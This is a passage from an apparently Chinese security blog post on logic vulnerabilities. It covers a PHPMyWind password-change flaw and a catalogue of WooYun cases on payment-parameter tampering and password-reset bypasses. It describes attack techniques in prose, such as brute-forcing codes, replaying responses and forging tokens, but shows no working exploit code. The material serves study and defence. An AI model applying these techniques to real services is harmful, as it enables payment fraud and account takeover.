168);">if</span>($dosql-&gt;ExecNoneQuery($sql))</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">{</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    ShowMsg(msg: <span style="box-sizing: inherit;color: rgb(113, 140, 0);">'资料更新成功'</span>, gourl: <span style="box-sizing: inherit;color: rgb(113, 140, 0);">'?c=edit'</span>);</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    <span style="box-sizing: inherit;color: rgb(137, 89, 168);">exit</span>();</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">}</span><br style="box-sizing: inherit;"  /></pre></td></tr></tbody></table></figure><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">第一个if判断的作用是“判断用户提交的新密码是否为空”，在用户提交的新密码不为空的情况下，才会进行‘旧密码的比对’，如果提交的旧密码和数据库的查询结果不一致，则不允许继续进行更换密码的操作。第二个if判断的作用仍为“判断用户提交的新密码是否为空”，在用户提交的新密码不为空的情况下，对新密码进行哈希运算，随后进行SQL语句的拼接。这两个if语句存在了逻辑漏洞。因为，如果我们提交的新密码（password变量和repassword变量）为空，则可以绕过对旧密码（oldpassword变量）的验证。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在这里之所以要使用XSS获取cookie，是因为当SQL语句满足条件<code style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 13.6px;background: rgb(252, 242, 242);border-radius: 3px;color: rgb(215, 62, 72);line-height: 1.25;padding: 2px 4px;">id='$id' AND username ='$c_uname';</code>时，才可进行update操作。变量<code style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 13.6px;background: rgb(252, 242, 242);border-radius: 3px;color: rgb(215, 62, 72);line-height: 1.25;padding: 2px 4px;">c_uname</code>值（明文）来源于<code style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 13.6px;background: rgb(252, 242, 242);border-radius: 3px;color: rgb(215, 62, 72);line-height: 1.25;padding: 2px 4px;">AuthCode($_COOKIE['username'])</code>，即先取得Cookie中username(密文)的值，然后通过AuthCode函数配合配置文件中的密钥来获取明文。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">PHPMyWind采用Cookie保存混淆化的用户登录信息。因为配置文件中的密钥是在CMS搭建时随机生成的，算法也不可逆，因此要在知道c_name变量的前提下，从正向伪造username等变量，以通过权限验证具有较大难度。为获取Cookie中的username等值，可考虑借助反射型XSS漏洞。</p><h3 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 1.25rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0X04&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他实例</h3><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">现在wooyun已经没了，只能在一些镜像网站看漏洞合集，以<code style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 13.6px;background: rgb(252, 242, 242);border-radius: 3px;color: rgb(215, 62, 72);line-height: 1.25;padding: 2px 4px;">逻辑漏洞</code>为关键词搜索到了186个相关漏洞，基本上把每个漏洞都过了一遍，也没办法复现，记录一些比较有代表性的案例，权当搜集思路吧。</p><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">支付业务相关逻辑漏洞</h4><h5 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 0.875rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">常见手法</h5><p>1.修改金额；</p><p>2.修改商品数量；</p><p>3.修改优惠金额；</p><p>4.修改数量、单价，优惠价格参数为负数、小数，无限大；</p><p>5.商品价格更改；</p><p>6.支付key泄露等。</p><p><br  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">实际安全中会有一些比较特别的，反正各种能改的参数都去尝试。个数<em style="box-sizing: inherit;">单价-优惠券个数</em>单价=总额，每个值都可能存在问题，就看服务自身处理是否有问题了。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>顺丰宝业务逻辑漏洞</strong>：数量和金额没有做签名</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2011-02272.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>移动手机支付业务逻辑漏洞</strong>：爆破四位验证码</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2011-02513.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>新东方逻辑支付漏洞</strong>：修改运费金额为负数，使得课程金额+运费大于0即可</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2013-019761.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>中国零食网支付逻辑漏洞</strong>：同上</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2014-074483.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>阿里云计算按量付费逻辑漏洞一枚（低价享受超级主机</strong>）：经过base64编码的数据可以被篡改，并且后端会接受篡改的数据</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2013-023789.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>乐视商城支付逻辑漏洞（价格可更改）</strong>：价格参数明文显示在url，可以直接更改</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2013-036787.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>再次挖掘乐视商城支付逻辑漏洞</strong>：同上</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2014-053181.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>读览天下支付逻辑漏洞可刷充值金额</strong>：替换支付订单号</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2014-051673.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>益盟爱炒股商城支付逻辑漏洞</strong>：修改Cookie中的参数值</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2015-093365.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>饿了么逻辑漏洞之免费吃喝不是梦</strong>：<code style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 13.6px;background: rgb(252, 242, 242);border-radius: 3px;color: rgb(215, 62, 72);line-height: 1.25;padding: 2px 4px;">手机号+;+手机号</code>绕过服务器对手机号码的次数限制</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0125060.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>七夕单身专场之性多多免费刷成人用品(支付逻辑漏洞)</strong>：改负数刷代币</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0135459.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>大疆某处支付逻辑漏洞可1元买无人机</strong>：https改为http访问，修改支付的参数</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0194751.html</p><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">密码找回相关逻辑漏洞</h4><h5 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 0.875rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">常见手法</h5><p style="box-sizing: inherit;margin-bottom: 1rem;">1.找回密码的验证码为四位数字可爆破真实验证码；</p><p style="box-sizing: inherit;margin-bottom: 1rem;">2.采用本地验证,可以先尝试修改自己的帐号密码，保存正确的返回包，然后修改他人密码的时候替换返回包；</p><p style="box-sizing: inherit;margin-bottom: 1rem;">3.最终修改密码的数据包，以另外的ID作为身份判断（例如userid），而该ID在别处可以获取到；</p><p style="box-sizing: inherit;margin-bottom: 1rem;">4.接受验证码的手机号修改为自己的号码，然后输入自己的号码接收到的验证码去进行密码重置；</p><p style="box-sizing: inherit;margin-bottom: 1rem;">5.获取验证码的时候，会生成一个身份标识（例如cookie值），那么我们就替换他人账号的身份证重置他人的密码；</p><p style="box-sizing: inherit;margin-bottom: 1rem;"><br  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">具体可以去i春秋看carry_your发过的一篇专门针对</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>密码重置的视频</strong></span><strong>：</strong><span style="font-size:14px;line-height:34px;;">https://www.ichunqiu.com/course/59045</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">用户凭证暴力破解</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">四位或者六位的纯数字</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 当当网任意用户密码修改漏洞</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2012-011833.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 微信任意用户密码修改漏洞</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2012-011720.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">返回凭证</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">url返回验证码及token</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 走秀网秀团任意密码修改缺陷</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2012-05630.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: 天天网任意账户密码重置（二）</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-058210.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">密码找回凭证在页面中</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">通过密保问题找回密码</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: sohu邮箱任意用户密码重置</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2012-04728.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">返回短信验证码</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: 新浪某站任意用户密码修改（验证码与取回逻辑设计不当）</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-085124.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">邮箱弱token</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">时间戳的md5</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: 奇虎360任意用户密码修改漏洞</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2012-08333.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">用户名 &amp; 服务器时间</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 中兴某网站任意用户密码重置漏洞（经典设计缺陷案例）</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://wooyun.x10sec.org/static/bugs/wooyun-2015-090226.html</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">用户凭证有效性</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">短信验证码</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: OPPO手机重置任意账户密码（3）</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-053349.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: 第二次重置OPPO手机官网任意账户密码（秒改）</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-053079.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: OPPO修改任意帐号密码</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2013-020032.html</span></p><p 